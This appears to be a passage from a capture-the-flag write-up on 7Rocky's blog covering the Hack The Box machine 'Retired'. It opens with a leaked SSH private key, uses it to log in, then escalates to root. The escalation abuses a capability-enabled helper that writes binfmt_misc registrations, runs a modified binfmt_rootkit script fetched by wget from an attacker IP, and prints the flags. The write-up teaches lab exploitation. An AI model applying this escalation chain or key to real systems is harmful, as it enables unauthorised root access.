TR76WaUWtUUJ2EExSD0Am3DQMq4sgLT9tb+rlU7DoHtoSPX6CfdInH9ciRnLG1kVbDaEaa
NT2anONVOswKJWVYgUN83cCCPyRzQJLPC6u7uSdhXU9sGuN34m5wQYp3wFiRnIdKgTcnI8
IoVRX0rnTtBUWeiduhdi2XbYh5OFFjh77tWCi9eTR7wopwUGR0u5sbDZYGPlOWNk22+Ncw
qQMIq0f4TBegkOUNV85gyEkIwifjgvfdw5FJ4zhoVbbevgo7IVz3gIYfDjktTF+n9dAAAA
wDyIzLbm4JWNgNhrc7Ey8wnDEUAQFrtdWMS/UyZY8lpwj0uVw8wdXiV8rFFPZezpyio9nr
xybImQU+QgCBdqQSavk4OJetk29fk7X7TWmKw5dwLuEDbJZo8X/MozmhgOR9nhMrBXR2g/
yJuCfKA0rcKby+3TSbl/uCk8hIPUDT+BNYyR5yBggI7+DKQBvHa8eTdvqGRnJ9jUnP6tfB
KCKW97HIfCpt5tzoKiJ7/eAuGEjjHN28GP1u4iVoD0udnUHQAAAMEA+RceJG5scCzciPd9
7zsHHTpQNhKQs13qfgQ9UGbyCit+eWzc/bplfm5ljfw+cFntZULdkhiFCIosHPLxmYe8r0
FZUzTqOeDCVK9AZjn8uy8VaFCWb4jvB+oZ3d+pjFKXIVWpl0ulnpOOoHHIoM7ghudXb0vF
L8+QpuPCuHrb2N9JVLxHrTyZh3+v9Pg/R6Za5RCCT36R+W6es8Exoc9itANuoLudiUtZif
84JIKNaGGi6HGdAqHaxBmEn7N/XDu7AAAAwQDuOLR38jHklS+pmYsXyLjOSPUlZI7EAGlC
xW5PH/X1MNBfBDyB+7qjFFx0tTsfVRboJvhiYtRbg/NgfBpnNH8LpswL0agdZyGw3Np4w8
aQSXt9vNnIW2hDwX9fIFGKaz58FYweCXzLwgRVGBfnpq2QSXB0iXtLCNkWbAS9DM3esjsA
1JCCYKFMrvXeeshyxnKmXix+3qeoh8TTQvr7ZathE5BQrYXvfRwZJQcgh8yv71pNT3Gpia
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>Now we can connect as <code>dev</code> and get the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 id_rsa

<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i id_rsa dev@10.10.11.154  
<span class="code-green">dev@retired</span>:<span class="code-blue">~</span>$ cat user.txt
f78b01da6c3d56436a6005509fdff826
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>This user owns a directory called <code>emuemu</code> (remember from the website):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~</span>$ ls -la
total 40
drwx------ 6 dev  dev  4096 Mar 11 14:36 <span class="code-blue">.</span>
drwxr-xr-x 3 root root 4096 Mar 11 14:36 <span class="code-blue">..</span>
lrwxrwxrwx 1 root root    9 Oct 13 02:59 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>  
-rw------- 1 dev  dev   220 Aug  4  2021 .bash_logout
-rw------- 1 dev  dev  3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 dev  dev  4096 Mar 11 14:36 <span class="code-blue">.local</span>
-rw------- 1 dev  dev   807 Aug  4  2021 .profile
drwx------ 2 dev  dev  4096 Mar 11 14:36 <span class="code-blue">.ssh</span>
drwx------ 2 dev  dev  4096 Mar 11 14:36 <span class="code-blue">activate_license</span>
drwx------ 3 dev  dev  4096 Mar 11 14:36 <span class="code-blue">emuemu</span>
-rw-r----- 1 root dev    33 Apr  3 21:28 user.txt
</code></pre></div><p>We have all this stuff:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ ls -la
total 68
drwx------ 3 dev dev  4096 Mar 11 14:36 <span class="code-blue">.</span>
drwx------ 6 dev dev  4096 Mar 11 14:36 <span class="code-blue">..</span>
-rw------- 1 dev dev   673 Oct 13 02:59 Makefile
-rw------- 1 dev dev   228 Oct 13 02:59 README.md
-rw------- 1 dev dev 16608 Oct 13 02:59 emuemu
-rw------- 1 dev dev   168 Oct 13 02:59 emuemu.c
-rw------- 1 dev dev 16864 Oct 13 02:59 reg_helper
-rw------- 1 dev dev   502 Oct 13 02:59 reg_helper.c  
drwx------ 2 dev dev  4096 Mar 11 14:36 <span class="code-blue">test</span>
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ ls -la test
total 12
drwx------ 2 dev dev 4096 Mar 11 14:36 <span class="code-blue">.</span>
drwx------ 3 dev dev 4096 Mar 11 14:36 <span class="code-blue">..</span>
-rwxr-xr-x 1 dev dev   70 Oct 13 02:59 <span class="code-green">examplerom</span>
</code></pre></div><p>Let&rsquo;s check the <code>README.md</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat README.md
EMUEMU is the official software emulator for the handheld console OSTRICH.

After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal.  
For example the ROM named `rom` can be run with `./rom`.
</code></pre></div><p>It says that we can execute a ROM like a common executable file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ test/examplerom  
EMUEMU is still under development.
</code></pre></div><p>Nice, we are able to execute a ROM, let&rsquo;s check the C files:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat emuemu.c  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>

<span class="mtk3">/*</span> <span class="mtk3">currently</span> <span class="mtk3">this</span> <span class="mtk3">is</span> <span class="mtk3">only</span> <span class="mtk3">a</span> <span class="mtk3">dummy</span> <span class="mtk3">implementation</span> <span class="mtk3">doing</span> <span class="mtk3">nothing</span> <span class="mtk3">*/</span>  

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"EMUEMU</span> <span class="mtk4">is</span> <span class="mtk4">still</span> <span class="mtk4">under</span> <span class="mtk4">development."</span><span class="mtk1">);</span>
    <span class="mtk5">return</span> <span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Hey! This file generates the ROM we just executed. Let&rsquo;s verify it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ file test/examplerom
test/examplerom: data
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat test/examplerom
7OSTRICHROM
this is a minimal rom with a valid file type signature
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ xxd test/examplerom
00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74  .7OSTRICH.ROM..t  
00000010: 6869 7320 6973 2061 206d 696e 696d 616c  his is a minimal
00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69   rom with a vali
00000030: 6420 6669 6c65 2074 7970 6520 7369 676e  d file type sign
00000040: 6174 7572 650a                           ature.
</code></pre></div><h3 id="rom-analysis">ROM analysis</h3><p>What&rsquo;s happening here? <code>test/examplerom</code> seems to be a normal file. At least, it is not an ELF. Let&rsquo;s see if <code>reg_helper.c</code> clarifies it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat reg_helper.c  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#define</span> <span class="mtk8">_GNU_SOURCE</span>

<span class="mtk5">#include</span> <span class="mtk4">&lt;fcntl.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;string.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;sys/stat.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;sys/types.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk7 mtki">char</span> <span class="mtk1">cmd[</span><span class="mtk6">512</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk1">{</span> <span class="mtk6">0</span> <span class="mtk1">};</span>

    <span class="mtk8">read</span><span class="mtk1">(STDIN_FILENO,</span> <span class="mtk1">cmd,</span> <span class="mtk5">sizeof</span><span class="mtk1">(cmd));</span> <span class="mtk1">cmd[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

    <span class="mtk7 mtki">int</span> <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/proc/sys/fs/binfmt_misc/register"</span><span class="mtk1">,</span> <span class="mtk1">O_WRONLY);</span>  
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span> <span class="mtk5">==</span> <span class="mtk1">fd)</span>
        <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"open"</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">write</span><span class="mtk1">(fd,</span> <span class="mtk1">cmd,</span> <span class="mtk8">strnlen</span><span class="mtk1">(cmd,</span><span class="mtk5">sizeof</span><span class="mtk1">(cmd)))</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span>
        <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"write"</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">close</span><span class="mtk1">(fd)</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span>
        <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"close"</span><span class="mtk1">);</span>

    <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>This is somewhat interesting, we should do some research on <code>/proc/sys/fs/binfmt_misc/register</code>. But let&rsquo;s take a look at <code>Makefile</code> before:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat Makefile  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">CC</span> <span class="mtk1">:=</span> <span class="mtk1">gcc</span>
<span class="mtk1">CFLAGS</span> <span class="mtk1">:=</span> <span class="mtk1">-std=c99</span> <span class="mtk1">-Wall</span> <span class="mtk1">-Werror</span> <span class="mtk1">-Wextra</span> <span class="mtk1">-Wpedantic</span> <span class="mtk1">-Wconversion</span> <span class="mtk1">-Wsign-conversion</span>  

<span class="mtk1">SOURCES</span> <span class="mtk1">:=</span> <span class="mtk4">$(</span><span class="mtk7">wildcard</span> <span class="mtk6">*</span><span class="mtk4">.c)</span>
<span class="mtk1">TARGETS</span> <span class="mtk1">:=</span> <span class="mtk4">$(</span><span class="mtk1">SOURCES:.c=</span><span class="mtk4">)</span>

<span class="mtk7">.PHONY</span><span class="mtk1">:</span> <span class="mtk1">install</span> <span class="mtk1">clean</span>

<span class="mtk8">install</span><span class="mtk1">:</span> <span class="mtk4">$(</span><span class="mtk1">TARGETS</span><span class="mtk4">)</span>
        <span class="mtk1">@echo</span> <span class="mtk1">"[+]</span> <span class="mtk1">Installing</span> <span class="mtk1">program</span> <span class="mtk1">files"</span>
        <span class="mtk1">install</span> <span class="mtk1">--mode</span> <span class="mtk1">0755</span> <span class="mtk1">emuemu</span> <span class="mtk1">/usr/bin/</span>
        <span class="mtk1">mkdir</span> <span class="mtk1">--parent</span> <span class="mtk1">--mode</span> <span class="mtk1">0755</span> <span class="mtk1">/usr/lib/emuemu</span> <span class="mtk1">/usr/lib/binfmt.d</span>
        <span class="mtk1">install</span> <span class="mtk1">--mode</span> <span class="mtk1">0750</span> <span class="mtk1">--group</span> <span class="mtk1">dev</span> <span class="mtk1">reg_helper</span> <span class="mtk1">/usr/lib/emuemu/</span>
        <span class="mtk1">setcap</span> <span class="mtk1">cap_dac_override=ep</span> <span class="mtk1">/usr/lib/emuemu/reg_helper</span>

        <span class="mtk1">@echo</span> <span class="mtk1">"[+]</span> <span class="mtk1">Register</span> <span class="mtk1">OSTRICH</span> <span class="mtk1">ROMs</span> <span class="mtk1">for</span> <span class="mtk1">execution</span> <span class="mtk1">with</span> <span class="mtk1">EMUEMU"</span>
        <span class="mtk8">echo</span> <span class="mtk8">'</span><span class="mtk1">:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/em</span><span class="mtk1">uemu:'</span> <span class="mtk6">\</span>
                <span class="mtk1">|</span> <span class="mtk1">tee</span> <span class="mtk1">/usr/lib/binfmt.d/emuemu.conf</span> <span class="mtk6">\</span>
                <span class="mtk1">|</span> <span class="mtk1">/usr/lib/emuemu/reg_helper</span>

<span class="mtk8">clean</span><span class="mtk1">:</span>
        <span class="mtk1">rm</span> <span class="mtk1">-f</span> <span class="mtk1">--</span> <span class="mtk4">$(</span><span class="mtk1">TARGETS</span><span class="mtk4">)</span>
</code></pre></div><p>Nice, we know there are binaries at <code>/usr/bin/emuemu</code> and <code>/usr/lib/emuemu/reg_helper</code>. They are the same as the ones we have seen before:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ md5sum /usr/bin/emuemu emuemu /usr/lib/emuemu/reg_helper reg_helper  
27641ed1f6105c6f70f5167610fa0b7e  /usr/bin/emuemu
27641ed1f6105c6f70f5167610fa0b7e  emuemu
1600a7013d283b9aaa6b7a07f8e45b2a  /usr/lib/emuemu/reg_helper
1600a7013d283b9aaa6b7a07f8e45b2a  reg_helper
</code></pre></div><p>And we cannot modify them. Notice that the <code>Makefile</code> is setting a custom executable format (<code>binfmt</code>). It is stored in <code>/usr/lib/binfmt.d/emuemu.conf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat /usr/lib/binfmt.d/emuemu.conf  
:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:
</code></pre></div><p>So every file that starts with <code>\x13\x37OSTRICH\x00ROM\x00</code> will be executed with <code>/usr/bin/emuemu</code>. Now everything is clear:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ /usr/bin/emuemu
EMUEMU is still under development.
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ xxd test/examplerom
00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74  .7OSTRICH.ROM..t  
00000010: 6869 7320 6973 2061 206d 696e 696d 616c  his is a minimal
00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69   rom with a vali
00000030: 6420 6669 6c65 2074 7970 6520 7369 676e  d file type sign
00000040: 6174 7572 650a                           ature.
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ test/examplerom
EMUEMU is still under development.
</code></pre></div><p>Because of <code>reg_helper</code>, we are able to create our custom executable file formats. For instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ echo ':test:M::rocky::/usr/bin/emuemu:' | /usr/lib/emuemu/reg_helper  
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ echo -e 'rocky\nThis is a custom executable file' > /tmp/test
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat /tmp/test
rocky
This is a custom executable file
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ chmod +x /tmp/test
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ /tmp/test
EMUEMU is still under development.
</code></pre></div><h3 id="binfmt_misc-exploitation"><code>binfmt_misc</code> exploitation</h3><p>Alright, but what can we do with this feature? Well, there is an exploit for <code>/proc/sys/fs/binfmt_misc/register</code> when we are able to write it, and we are because <code>reg_helper</code> is modifying it (it has a capability <code>CAP_DAC_OVERRIDE</code> set). The exploit can be found <a href="https://github.com/toffan/binfmt_misc/blob/master/binfmt_rootkit">here</a>.</p><p>We must download the script and modify some lines. First of all, I&rsquo;ll get rid of the validation that <code>/proc/sys/fs/binfmt_misc/register</code> is writable (we know it is). And then, we need to modify the way data is being written into the register. Hence, this line:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">echo</span> <span class="mtk4">"</span><span class="mtk1">$binfmt_line</span><span class="mtk4">"</span> <span class="mtk5">&gt;</span> <span class="mtk4">"</span><span class="mtk1">$mountpoint</span><span class="mtk4">"</span><span class="mtk1">/register</span>  
</code></pre></div><p>Becomes this one:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">echo</span> <span class="mtk4">"</span><span class="mtk1">$binfmt_line</span><span class="mtk4">"</span> <span class="mtk5">|</span> <span class="mtk1">/usr/lib/emuemu/reg_helper</span>  
</code></pre></div><p>Finally, we download the script into the machine and run it to become <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cd /tmp
<span class="code-green">dev@retired</span>:<span class="code-blue">/tmp</span>$ wget -q 10.10.17.44/binfmt_rootkit  
<span class="code-green">dev@retired</span>:<span class="code-blue">/tmp</span>$ chmod +x binfmt_rootkit
<span class="code-green">dev@retired</span>:<span class="code-blue">/tmp</span>$ ./binfmt_rootkit
uid=0(root) euid=0(root)
# cat /root/root.txt
d8544f2779e7f65f61a1fcbe7eee471a
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#directory-path-traversal-exploitation">Directory Path Traversal exploitation</a></li><li><a href="#binary-analysis">Binary analysis</a></li><li><a href="#exploit-preparation">Exploit preparation</a></li><li><a href="#exploit-development">Exploit development</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-user-dev">Lateral movement to user <code>dev</code></a></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#rom-analysis">ROM analysis</a></li><li><a href="#binfmt_misc-exploitation"><code>binfmt_misc</code> exploitation</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>